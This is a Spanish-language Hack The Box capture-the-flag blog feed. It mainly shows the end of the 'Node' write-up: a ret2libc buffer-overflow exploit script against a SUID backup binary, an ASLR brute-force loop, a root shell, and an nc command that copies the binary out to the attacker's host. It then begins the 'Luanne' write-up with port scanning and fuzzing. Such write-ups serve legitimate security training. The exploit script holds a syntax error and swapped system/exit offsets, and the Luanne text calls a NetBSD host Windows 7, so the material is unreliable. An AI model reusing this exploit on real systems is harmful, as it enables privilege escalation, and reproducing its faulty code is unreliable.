&lt;p&gt;Nos devuelve un resultado en base64, y si lo decodeamos obtenemos un archivo comprimido, y al unzipearlo nos pide ingresar una contraseña.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ unzip file
Archive:  file
[file] root/.profile password: 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Podemos usar la que previamente obtuvimos con &lt;code&gt;fcrackzip&lt;/code&gt; ya que se puede estar reutilizando la contraseña.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ unzip file
Archive:  file
[file] root/.profile password: 
  inflating: root/.profile           
 extracting: root/.cache/motd.legal-displayed  
 extracting: root/root.txt           
  inflating: root/.bashrc            
  inflating: root/.viminfo           
 extracting: root/.nano/search_history  
❯ 
❯ ls
 root   file
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Efectivamente logramos descomprimirlo usando la contraseña previa &lt;code&gt;magicword&lt;/code&gt;, ahora podemos ver lo que hay dentro del directorio y encontramos la segunda flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ cd root
❯ ls
 root.txt
❯ cat root.txt
98ef491742abffa14a62facb8d832818
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;explotacion-alterna&quot;&gt;EXPLOTACION ALTERNA  &lt;a href=&quot;#explotacion-alterna&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Vimos anteriormente que pudimos leer la flag &lt;code&gt;root.txt&lt;/code&gt;, pero no logramos obtener acceso como el usuario &lt;code&gt;root&lt;/code&gt; al sistema. Anteriormente vimos que al binario &lt;code&gt;backup&lt;/code&gt;, le pasabamos un parametro final correspondiente a un directorio, pero si tratamos de pasar muchos caracteres como ultimo parametro hacemos que el programa se corrompa.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;tom@node:/$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 $(python -c 'print(&quot;A&quot;*40000)')   
/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 $(python -c 'print(&quot;A&quot;*40000)')
Segmentation fault (core dumped)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vemos que se acontece un desbordamiento de buffer o &lt;code&gt;bufferoverflow&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Vamos a traernos el binario a nuestro equipo.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;tom@node:/usr/local/bin$ nc 10.10.16.2 443 &amp;lt; backup
nc 10.10.16.2 443 &amp;lt; backup
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Para ejecutarlo sin problemas, voy a crearme un directorio y el archivo donde se almacenan las keys.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir /etc/myplace
❯ nvim /etc/myplace/keys
❯ cat /etc/myplace/keys
a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508
45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474
3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Para poder ver los registros al ejecutar el binario a bajo nivel usare &lt;code&gt;gdb&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;gef➤  r a 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 $(python3 -c 'print(&quot;A&quot;*3000)')
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Node/node9.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos que se acontece el desbordamiento sobrescribiendo los registros y que alteran el flujo del programa, esto termina corrompiendolo cuando introducimos muchos caracteres capaces de sobrepasar el tamaño del buffer asignado.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Node/buff.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si quieres saber mas acerca de esto te dejo el siguiente articulo:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://keepcoding.io/blog/que-es-un-buffer-overflow/&quot;&gt;https://keepcoding.io/blog/que-es-un-buffer-overflow/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Lo que podriamos hacer es que el flujo del programa podemos meterlo en la pila, donde a traves de un shellcode podemos ejecutar comandos y otorgarnos una reverse shell.&lt;/p&gt;

&lt;p&gt;Pero si vemos las protecciones del binario este cuenta con  &lt;code&gt;data execution prevention&lt;/code&gt;. &lt;code&gt;NX&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;gef➤  checksec
[+] checksec for '/home/fmiracle/Machines/Node/content/backup'
[*] .gef-2b72f5d0d9f0f218a91cd1ca5148e45923b950d5.py:L8764 'checksec' is deprecated and will be removed in a feature release. Use Elf(fname).checksec()
Canary                        : ✘ 
NX                            : ✓ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : Partial
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Asi que necesitamos buscar otra forma de explotar del binario. Podemos usar un &lt;code&gt;ret2libc&lt;/code&gt; que lo que hace es aprovecharse la la libreria &lt;code&gt;libc&lt;/code&gt; que el binario esta utilizando.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;tom@node:/usr/local/bin$ which backup | xargs ldd
which backup | xargs ldd
	linux-gate.so.1 =&amp;gt;  (0xf7723000)
	libc.so.6 =&amp;gt; /lib32/libc.so.6 (0xf7564000)
	/lib/ld-linux.so.2 (0xf7724000)
tom@node:/usr/local/bin$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Con ello en vez de mandar el flujo del programa a la pila, podemos usar el &lt;code&gt;libc&lt;/code&gt; para ejecutar una llamada a nivel de sistema.&lt;/p&gt;

&lt;p&gt;Para ello necesitamos primero saber si la maquina cuenta con &lt;code&gt;ÀSLR&lt;/code&gt; &lt;code&gt;aleatorizacion de direcciones de la memoria&lt;/code&gt;, ello podemos verificarlo leyendo.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;cat /proc/sys/kernel/randomize_va_space
2
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Al tener un valor de 2, quiere decir que la maquina si cuenta con &lt;code&gt;ASLR&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Otra forma de verlo seria usando la siguente expresión, donde podemos ver que efectivamente cuenta con &lt;code&gt;ASLR&lt;/code&gt; al cambiar las direcciones.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;for i in $(seq 1 10); do which backup | xargs ldd | grep libc | awk 'NF{print $NF}' | tr -d '()'; done
&amp;lt;ch backup | xargs ldd | grep libc | awk 'NF{print $NF}' | tr -d '()'; done  
0xf7553000
0xf752d000
0xf75a7000
0xf75bc000
0xf7579000
0xf7618000
0xf75ff000
0xf7613000
0xf7601000
0xf7556000
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Pero pese a que exista &lt;code&gt;ASLR&lt;/code&gt;, al no ser muy largas pueden repetirse, por tanto aunque sean aleatorios pueden volver a repetirse al haber una colision, podemos burlar el &lt;code&gt;ASLR&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;for i in $(seq 1 1000); do which backup | xargs ldd | grep libc | awk 'NF{print $NF}' | tr -d '()' | grep 0xf752d000; done; break 
&amp;lt;grep libc | awk 'NF{print $NF}' | tr -d '()' | grep 0xf752d000; done; break 
0xf752d000
0xf752d000
0xf752d000
bash: break: only meaningful in a `for', `while', or `until' loop
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora para poder ejecutar un &lt;code&gt;ret2lib&lt;/code&gt; y poder ejecutar una llamada a nivel de sistema necesitaremos:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;La dirección de system&lt;/li&gt;
  &lt;li&gt;La dirección de exit&lt;/li&gt;
  &lt;li&gt;La dirección de la cadena &lt;code&gt;/bin/sh&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Basicamente lo que queremos lograr es &lt;code&gt;os.system(&quot;/bin/sh&quot;)&lt;/code&gt; y al ser el binario &lt;code&gt;suid&lt;/code&gt; lo hara como &lt;code&gt;root&lt;/code&gt; y ganaremos acceso como este usuario.&lt;/p&gt;

&lt;p&gt;Para ello primero debemos de saber de las &lt;code&gt;A&lt;/code&gt; que insertamos antes cuantas debemos insertar para tener control del registro &lt;code&gt;eip&lt;/code&gt;. Para lo cual podemos usar &lt;code&gt;pattern create&lt;/code&gt; y generar un numero de cadena aleatoria.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;gef➤  pattern create 1000
[+] Generating a pattern of 1000 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaaj
[+] Saved as '$_gef0'
gef➤  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Insertamos la cadena generada.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Node/node10.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y ahora con &lt;code&gt;pattern offset&lt;/code&gt; podemos saber cual es el limite para sobreescribir &lt;code&gt;eip&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;gef➤  patter offset $eip
[+] Searching for '$eip'
[+] Found at offset 512 (little-endian search) likely
[+] Found at offset 320 (big-endian search)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vemos que necesitamos &lt;code&gt;512&lt;/code&gt; caracteres antes de sobrescribir &lt;code&gt;eip&lt;/code&gt;. Verificamos con la ayuda de python imprimiendo &lt;code&gt;512 A&lt;/code&gt; y adicionamos &lt;code&gt;4 B&lt;/code&gt;, que como resultado ahora el registro &lt;code&gt;eip&lt;/code&gt; valdria &lt;code&gt;BBBB&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Node/node11.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora que sabemos el offset lo siguiente sera encontrar las direcciones de system, exit y sh. Y para ello primero vamos a coger una dirección base de libc, puede ser cualquiera &lt;code&gt;0xf752d000&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Teniendo esto podemos ir armandonos un script en python. Donde primero especificamos el offset de caracteres, debemos encontrar primero los offsets de las direcciones de &lt;code&gt;system, exit y binsh&lt;/code&gt;. Ya que una vez tengamos estos podamos obtener las direcciones reales de estas usando la &lt;code&gt;libc_base + los offsets&lt;/code&gt; de cada una.&lt;/p&gt;

&lt;p&gt;Y usamos pack para representar las direcciones en &lt;code&gt;litelediam&lt;/code&gt; y evitar darle la vuelta a las direcciones.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;#!/usr/bin/python3


from struct import pack

offset = 512

junk = &quot;A&quot;*offset

#ret2lib - EIP  -&amp;gt; system -&amp;gt; exit -&amp;gt; /bin/sh

libc_base_add = 0xf752d000

system_add_offset = 

exit_add_offset = 

binsh_add_offset = 


system_add_real = pack(&quot;&amp;lt;I&quot;, libc_base_add + system_add_offset )

exit_add_real = pack(&quot;&amp;lt;I&quot;, libc_base_add + exit_add_offset)

binsh_add_real = pack(&quot;&amp;lt;I&quot;), libc_base_add + binsh_add_offset)


payload = junk + system_add_real + exit_add_real + binsh_add_real
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Finalmente como payload deberiamos pasarle el junk sumado mas las direcciones reales de system, exit y binsh.&lt;/p&gt;

&lt;p&gt;Ahora para conseguir los offset, primero usaremos &lt;code&gt;readelf&lt;/code&gt; para las direcciones de &lt;code&gt;system y exit&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;readelf -s /lib32/libc.so.6 | grep -E &quot; system@@| exit@@&quot;
&amp;lt;adelf -s /lib32/libc.so.6 | grep -E &quot; system@@| exit@@&quot;                     
   141: 0002e7b0    31 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0
  1457: 0003a940    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y para obtener el offset de binsh, podemos usar &lt;code&gt;strings&lt;/code&gt; con los siguientes parametros:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;strings -a -t x /lib32/libc.so.6 | grep &quot;/bin/sh&quot;
 15900b /bin/sh
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora solo debemos correr el programa multiples veces, para causar una colision en las direcciones hasta que &lt;code&gt;libc&lt;/code&gt; valga lo que ejecutamos en el script.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;#!/usr/bin/python3


from struct import pack

offset = 512

junk = &quot;A&quot;*offset

#ret2lib - EIP  -&amp;gt; system -&amp;gt; exit -&amp;gt; /bin/sh

libc_base_add = 0xf752d000

system_add_offset = 0x0002e7b0

exit_add_offset = 0x0003a940

binsh_add_offset = 0x0015900b

system_add_real = pack(&quot;&amp;lt;I&quot;, libc_base_add + system_add_offset )

exit_add_real = pack(&quot;&amp;lt;I&quot;, libc_base_add + exit_add_offset)

binsh_add_real = pack(&quot;&amp;lt;I&quot;), libc_base_add + binsh_add_offset)


payload = junk + system_add_real + exit_add_real + binsh_add_real

print(payload)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ejecutamos el exploit multiples veces y se ejecuta la &lt;code&gt;/bin/sh&lt;/code&gt; y ganamos acceso como el usuario &lt;code&gt;root&lt;/code&gt;, ahora solo debemos dirigirnos al directorio personal del usuario &lt;code&gt;root&lt;/code&gt; y visualizar la segunda flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;while true; do backup a 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 $(python exploit.py); done
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;# whoami
root
#cd /root
cat root.txt
98ef491742abffa14a62facb8d832818
&lt;/code&gt;&lt;/pre&gt;

</description>
        <pubDate>Mon, 17 Jul 2023 00:00:00 -0500</pubDate>
        <link>http://localhost:4000/hackthebox/htb-writeup-Node</link>
        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Node</guid>
        
        <category>Information Leaked</category>
        
        <category>Api Enumeration</category>
        
        <category>Cracking Hashes</category>
        
        <category>MongoDB Enumeration</category>
        
        <category>MongoTask Injection</category>
        
        <category>SUID Binary Explotation</category>
        
        <category>Buffer Overflow</category>
        
        
        <category>hackthebox</category>
        
      </item>
    
      <item>
        <title>Maquina Luanne - htb writeup</title>
        <description>&lt;p&gt;El dia de hoy vamos a resolver &lt;code&gt;Luanne&lt;/code&gt; de &lt;code&gt;hackthebox&lt;/code&gt; una maquina &lt;code&gt;linux&lt;/code&gt; de dificultad facil, para poder comprometer la maquina nos aprovecharemos de una ruta expuesta con una api en &lt;code&gt;JSON&lt;/code&gt; donde con la ayuda de &lt;code&gt;burpsuite&lt;/code&gt; aprovecharemos el uso de parametros para causar una inyección en &lt;code&gt;lua&lt;/code&gt; con la que ganaremos acceso a la maquina, despues aprovecharemos de un parametro de un servicio de &lt;code&gt;httpd&lt;/code&gt; que corre en &lt;code&gt;NETBSD&lt;/code&gt; obteniendo una clave publica con la que ganaremos acceso como un usario con mayores privilegios y finalmente en un comprimido que lograremos desencriptar obtendremos la contraseña del usuario &lt;code&gt;root&lt;/code&gt; y habremos comprometido el sistema.&lt;/p&gt;

&lt;p&gt;Esta maquina es divertida asi que a darle!.&lt;/p&gt;

&lt;p&gt;Vamos a comenzar como de costumbre creando un directorio con el nombre de la maquina:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Luanne
❯ ls
 Luanne
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;enumeracion&quot;&gt;ENUMERACION &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.218
PING 10.10.10.218 (10.10.10.218) 56(84) bytes of data.
64 bytes from 10.10.10.218: icmp_seq=1 ttl=254 time=123 ms

--- 10.10.10.218 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 122.913/122.913/122.913/0.000 ms
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vemos que la maquina nos responde, con un ttl de &lt;code&gt;254&lt;/code&gt; y contando el salto al ser &lt;code&gt;255&lt;/code&gt;, podemos usar siguiente pagina para saber a que posiblemente nos estamos enfrentando, que en este caso podria corresponder a un &lt;code&gt;NetBSD&lt;/code&gt;. Mas adelante cuando comprometamos la maquina validaremos si es correcto.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://subinsb.com/default-device-ttl-values/&quot;&gt;https://subinsb.com/default-device-ttl-values/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Luanne/lua1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;ESCANEO DE PUERTOS&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.218 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-29 16:31 GMT
Initiating SYN Stealth Scan at 16:31
Scanning 10.10.10.218 [65535 ports]
Discovered open port 80/tcp on 10.10.10.218
Discovered open port 22/tcp on 10.10.10.218
Discovered open port 9001/tcp on 10.10.10.218
Completed SYN Stealth Scan at 16:32, 26.67s elapsed (65535 total ports)
Nmap scan report for 10.10.10.218
Host is up, received user-set (0.28s latency).
Scanned at 2023-06-29 16:31:40 GMT for 27s
Not shown: 62926 filtered tcp ports (no-response), 2606 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
80/tcp   open  http       syn-ack ttl 63
9001/tcp open  tor-orport syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.83 seconds
           Raw packets sent: 129915 (5.716MB) | Rcvd: 2611 (104.460KB)
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;ESCANEO DE VERSION Y SERVICIOS&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p22,80,9001 10.10.10.218 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-29 16:33 GMT
Nmap scan report for 10.10.10.218
Host is up (0.27s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.0 (NetBSD 20190418-hpn13v14-lpk; protocol 2.0)
| ssh-hostkey: 
|   3072 20:97:7f:6c:4a:6e:5d:20:cf:fd:a3:aa:a9:0d:37:db (RSA)
|   521 35:c3:29:e1:87:70:6d:73:74:b2:a9:a2:04:a9:66:69 (ECDSA)
|_  256 b3:bd:31:6d:cc:22:6b:18:ed:27:66:b4:a7:2a:e4:a5 (ED25519)
80/tcp   open  http    nginx 1.19.0
| http-robots.txt: 1 disallowed entry 
|_/weather
|_http-server-header: nginx/1.19.0
|_http-title: 401 Unauthorized
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=.
9001/tcp open  http    Medusa httpd 1.12 (Supervisor process manager)
|_http-title: Error response
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=default
|_http-server-header: Medusa/1.12
Service Info: OS: NetBSD; CPE: cpe:/o:netbsd:netbsd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 190.40 seconds
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Podemos ver que nmap nos reporta dos rutas validas &lt;code&gt;robots&lt;/code&gt; y &lt;code&gt;weather&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Visulizamos información interesante de los puertos escaneados y que el equipo corresponde a una maquina &lt;code&gt;Windows 7&lt;/code&gt;:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Puerto&lt;/th&gt;
      &lt;th&gt;Servicio&lt;/th&gt;
      &lt;th&gt;Versión&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td&gt;SSH&lt;/td&gt;
      &lt;td&gt;OpenSSH 8.0&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;80&lt;/td&gt;
      &lt;td&gt;HTTP&lt;/td&gt;
      &lt;td&gt;nginx 1.19.0&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;9001&lt;/td&gt;
      &lt;td&gt;TOR-ORPORT&lt;/td&gt;
      &lt;td&gt;Medusa httpd 1.12&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;explotación&quot;&gt;EXPLOTACION &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Comenzamos usando &lt;code&gt;whatweb&lt;/code&gt;, para determinar las tecnologias que esta usando el servicio web.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ whatweb http://10.10.10.218
http://10.10.10.218 [401 Unauthorized] Country[RESERVED][ZZ], HTTPServer[nginx/1.19.0], IP[10.10.10.218], Title[401 Unauthorized], WWW-Authenticate[.][Basic], nginx[1.19.0]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;La herramienta nos reporta &lt;code&gt;unathorized&lt;/code&gt;, en otras palabras nos solicita credenciales.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ whatweb http://10.10.10.218:9001
http://10.10.10.218:9001 [401 Unauthorized] Country[RESERVED][ZZ], HTTPServer[Medusa/1.12], IP[10.10.10.218], Title[Error response], WWW-Authenticate[default][Basic]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vamos a proceder Abrimos el servicio con el navegador y vemos que efectivamente nos solicita credenciales para ingresar y si intentamos usar credenciales por defecto no conseguimos ingresar.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Luanne/lua2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Lo siguiente que haremos sera dirigirnos a la ruta que nmap nos reporto &lt;code&gt;robots.txt&lt;/code&gt; y podemos ver que dentro la ruta &lt;code&gt;weather&lt;/code&gt; esta desabilitada.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Luanne/lua3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ya que la ruta se reporta como desabilitada, vamos a suponer que existe y con &lt;code&gt;wfuzz&lt;/code&gt; vamos a tratar de fuzear por archivos dentro de esa ruta.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.218/weather/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.218/weather/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                               
=====================================================================

000007114:   200        1 L      12 W       90 Ch       &quot;forecast&quot;                                                                                                            
000015529:   404        7 L      11 W       153 Ch      &quot;hitb&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Despues de aplicar fuzzing, vemos que existe una ruta &lt;code&gt;forecast&lt;/code&gt; que si la visualizamos tenemos acceso a una api &lt;code&gt;json&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Luanne/lua4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;En el mensaje vemos que nos pide usar un paramatro, para poder listar las ciudades.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Luanne/lua5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como vemos que se estan usando parametros, vamos a pasar la petición por &lt;code&gt;burpsuite&lt;/code&gt; para tratar de realizar inyecciones en la petición que nos permitan aprovecharnos de esta, asi que mandamos la petición con ayuda de &lt;code&gt;foxyproxy&lt;/code&gt;.&lt;/p&gt;

